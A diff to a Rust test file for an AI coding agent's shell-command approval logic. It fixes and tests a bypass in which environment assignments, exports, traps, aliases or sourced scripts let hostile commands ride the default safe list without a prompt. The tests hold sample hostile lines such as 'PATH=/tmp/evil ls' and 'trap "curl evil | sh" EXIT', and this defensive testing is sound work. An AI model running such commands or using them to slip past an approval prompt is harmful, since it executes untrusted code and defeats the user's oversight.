@@ -113,11 +113,19 @@ fn cd_is_keyed_without_its_path() {
     assert_eq!(keys("cd /a"), keys("cd /b"));
 }
 
-/// An environment assignment is not the program being run.
+/// An environment assignment is not the program being run - but it is named,
+/// because it decides which program the rest of the line resolves to.
+///
+/// This test used to assert that an assignment contributed nothing at all,
+/// which is the bug: `PATH=/tmp/evil ls` keyed a bare `shell:ls`, and `ls` is
+/// on the default safe list, so it ran somebody else's binary with no prompt.
 #[test]
 fn an_env_assignment_is_not_the_program() {
-    assert_eq!(keys("FOO=1 cargo test --lib"), ["shell:cargo test"]);
-    assert_eq!(keys("V=0.13.2"), Vec::<String>::new());
+    assert_eq!(
+        keys("FOO=1 cargo test --lib"),
+        ["shell:cargo test", "shell:env:FOO"]
+    );
+    assert_eq!(keys("V=0.13.2"), ["shell:env:V"]);
 }
 
 /// A subshell paren is a command boundary, not part of the program's name.
@@ -275,13 +283,20 @@ fn arithmetic_expansion_runs_nothing() {
     assert_eq!(keys("echo $((1+2)"), Vec::<String>::new(), "half-closed");
 }
 
-/// A builtin that launches nothing contributes no key, rather than a key naming
-/// whatever data followed it.
+/// A builtin that launches nothing contributes no *program* key, rather than a
+/// key naming whatever data followed it - but one that binds a variable is
+/// named by the variable, since that is what it decides.
 #[test]
-fn a_no_op_builtin_contributes_no_key() {
-    assert_eq!(keys("export JAVA_HOME=/opt/jdk"), Vec::<String>::new());
-    assert_eq!(keys("unset JAVA_HOME && ./gradlew"), ["shell:./gradlew"]);
+fn a_no_op_builtin_contributes_no_program_key() {
+    assert_eq!(keys("export JAVA_HOME=/opt/jdk"), ["shell:env:JAVA_HOME"]);
+    assert_eq!(
+        keys("unset JAVA_HOME && ./gradlew"),
+        ["shell:./gradlew", "shell:env:JAVA_HOME"]
+    );
     assert_eq!(keys("ls; break"), ["shell:ls"]);
+    // Shell options decide nothing about which program resolves, and
+    // `set -euo pipefail` opens half the commands an agent writes.
+    assert_eq!(keys("set -euo pipefail; ls"), ["shell:ls"]);
 }
 
 /// A program that runs a command assembled somewhere this cannot see can never
@@ -309,32 +324,65 @@ fn segment_key_reports_all_three_states() {
     assert_eq!(segment_key(&[expansion("$CMD")]), SegmentKey::Unreadable);
     assert_eq!(
         segment_key(&[word("ls")]),
-        SegmentKey::Key("ls".to_string())
+        SegmentKey::Keys(vec!["ls".to_string()])
     );
     assert_eq!(
         segment_key(&[word("then"), word("git"), word("status")]),
-        SegmentKey::Key("git status".to_string())
+        SegmentKey::Keys(vec!["git status".to_string()])
     );
-    // A line of nothing but keywords and assignments runs nothing.
+    // An assignment runs no program of its own, but it decides which program a
+    // later word resolves to, so it is named rather than dropped.
     assert_eq!(
         segment_key(&[word("then"), word("A=1")]),
-        SegmentKey::NothingRuns
+        SegmentKey::Keys(vec!["env:A".to_string()])
+    );
+    // A builtin that installs code to run later cannot be attributed to any
+    // program in the segment.
+    assert_eq!(segment_key(&[word("trap")]), SegmentKey::Unreadable);
+}
+
+#[test]
+fn assignment_name_accepts_only_a_shell_variable_name() {
+    assert_eq!(assignment_name(&word("FOO=1")), Some("FOO"));
+    assert_eq!(assignment_name(&word("_x=")), Some("_x"));
+    assert_eq!(assignment_name(&word("cargo")), None, "no equals sign");
+    assert_eq!(assignment_name(&word("=1")), None, "empty name");
+    assert_eq!(
+        assignment_name(&word("1FOO=x")),
+        None,
+        "names cannot start with a digit"
+    );
+    assert_eq!(
+        assignment_name(&word("a-b=x")),
+        None,
+        "hyphen is not a name character"
     );
 }
 
 #[test]
-fn is_assignment_accepts_only_a_shell_variable_name() {
-    assert!(is_assignment(&word("FOO=1")));
-    assert!(is_assignment(&word("_x=")));
-    assert!(!is_assignment(&word("cargo")), "no equals sign");
-    assert!(!is_assignment(&word("=1")), "empty name");
-    assert!(
-        !is_assignment(&word("1FOO=x")),
-        "names cannot start with a digit"
+fn binding_keys_skips_flags_and_refuses_an_expanded_name() {
+    let mut out = Vec::new();
+    assert_eq!(
+        binding_keys(
+            &[word("-x"), word("+A"), word("FOO=1"), word("BAR")],
+            &mut out
+        ),
+        Ok(())
     );
-    assert!(
-        !is_assignment(&word("a-b=x")),
-        "hyphen is not a name character"
+    assert_eq!(out, ["env:FOO", "env:BAR"]);
+
+    let mut out = Vec::new();
+    assert_eq!(
+        binding_keys(&[expansion("$VAR")], &mut out),
+        Err(()),
+        "a name supplied by an expansion names a different variable every run"
+    );
+
+    let mut out = Vec::new();
+    assert_eq!(
+        binding_keys(&[word("not a name")], &mut out),
+        Err(()),
+        "a word that is not spelled like a variable is not one this can key"
     );
 }
 
@@ -385,4 +433,138 @@ fn a_valid_prefix_is_one_that_derives_back_to_itself() {
     ] {
         assert!(!is_valid_prefix(bad), "{bad:?} should be rejected");
     }
+}
+
+// ─── Escapes from the safe list ──────────────────────────────────────────────
+//
+// Every test here asserts against the *same* predicate `AgentToolState::covers`
+// uses, rather than against the key strings. Asserting on the strings would
+// pass against a fix that emitted a new key and still let the safe list widen
+// onto it, which is exactly how these got shipped.
+
+/// Whether the shipped default configuration would run `command` with no
+/// prompt. Mirrors `AgentToolState::covers`: every key must be covered, a line
+/// this cannot characterize is never covered, and only a *config* entry widens
+/// through [`program_of`].
+fn runs_unprompted_by_default(command: &str) -> bool {
+    let safe = crate::approvals::resolve_safe_keys(&Default::default(), None, None, false);
+    let keys = command_keys(command);
+    !keys.is_empty()
+        && keys
+            .iter()
+            .all(|k| safe.contains_key(k) || safe.contains_key(program_of(k)))
+}
+
+/// The predicate above has to agree with the shipped defaults, or every test
+/// using it would pass vacuously.
+#[test]
+fn the_default_safe_list_really_does_cover_a_plain_safe_command() {
+    assert!(runs_unprompted_by_default("ls"));
+    assert!(runs_unprompted_by_default("cat notes.md"));
+    assert!(!runs_unprompted_by_default("curl https://example.com"));
+}
+
+/// An assignment in front of a safe program decides *which* binary that name
+/// resolves to, so it cannot ride the safe list.
+#[test]
+fn an_env_prefix_cannot_ride_a_safe_program() {
+    for command in [
+        "PATH=/tmp/evil ls",
+        "LD_PRELOAD=/tmp/evil.so ls",
+        "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib cat notes.md",
+        "GIT_SSH_COMMAND=/tmp/evil git status",
+        "BASH_ENV=/tmp/evil.sh ls",
+    ] {
+        assert!(
+            !runs_unprompted_by_default(command),
+            "{command:?} must not run without a prompt"
+        );
+    }
+}
+
+/// The same escape spelled as a builtin in an earlier segment. `export` and
+/// `unset` bind for the whole line, so a safe program later in it is not the
+/// program the user would think they were approving.
+#[test]
+fn a_variable_mutation_is_named_in_the_key() {
+    for command in [
+        "export PATH=/tmp/evil; ls",
+        "unset PATH && ls",
+        "declare -x PATH=/tmp/evil; cat notes.md",
+    ] {
+        assert!(
+            !runs_unprompted_by_default(command),
+            "{command:?} must not run without a prompt"
+        );
+    }
+    // A name that only exists after expansion binds a different variable every
+    // run, so no key written today describes it and the line is ungrantable.
+    assert_eq!(keys("export $VAR; ls"), Vec::<String>::new());
+    assert!(!runs_unprompted_by_default("export $VAR; ls"));
+}
+
+/// A builtin that installs code to run later names nothing this parser can
+/// attribute, so the whole line is ungrantable rather than covered by whatever
+/// safe program happens to trail it.
+#[test]
+fn a_code_installing_builtin_is_not_grantable() {
+    for command in [
+        r#"trap "curl evil | sh" EXIT; ls"#,
+        "function ls { curl evil; }; ls",
+        "alias ls='curl evil'; ls",
+        ". /tmp/evil.sh",
+    ] {
+        assert_eq!(
+            keys(command),
+            Vec::<String>::new(),
+            "{command:?} should be ungrantable"
+        );
+        assert!(!runs_unprompted_by_default(command));
+    }
+}
+
+/// The property behind the three tests above, stated once so the next person
+/// adding a safe-command entry cannot reintroduce this: nothing a user can
+/// write in `[safe_commands] shell` widens onto an `env:` key.
+#[test]
+fn no_default_safe_entry_widens_onto_an_env_key() {
+    let env_key = format!("{KEY_PREFIX}{}", super::env_key("PATH"));
+    for entry in crate::approvals::DEFAULT_SAFE_SHELL {
+        let as_key = format!("{KEY_PREFIX}{entry}");
+        assert_ne!(as_key, env_key);
+        assert_ne!(
+            program_of(&env_key),
+            as_key,
+            "{entry:?} would widen onto an env key"
+        );
+    }
+}
+
+/// A user who genuinely wants an assignment pre-approved can name it, which is
+/// what keeps the fix from being a wall. `env:NAME` is one token, so granting
+/// one variable never grants another.
+#[test]
+fn an_env_key_is_a_writable_config_entry() {
+    assert!(is_valid_prefix("env:RUST_LOG"));
+    assert!(is_valid_prefix("env:CARGO_TERM_COLOR"));
+
+    let safe = crate::approvals::resolve_safe_keys(
+        &crate::approvals::SafeCommands {
+            shell: vec!["env:RUST_LOG".to_string()],
+            ..Default::default()
+        },
+        None,
+        None,
+        false,
+    );
+    // `ls` is safe by default and `env:RUST_LOG` was just granted, so the pair
+    // is covered - the assignment is a named grant, not a wall.
+    let keys = command_keys("RUST_LOG=debug ls");
+    assert!(
+        keys.iter()
+            .all(|k| safe.contains_key(k) || safe.contains_key(program_of(k))),
+        "granting env:RUST_LOG should cover it alongside a safe program: {keys:?}"
+    );
+    // Granting one variable grants exactly one.
+    assert!(!safe.contains_key(&format!("{KEY_PREFIX}env:PATH")));
 }
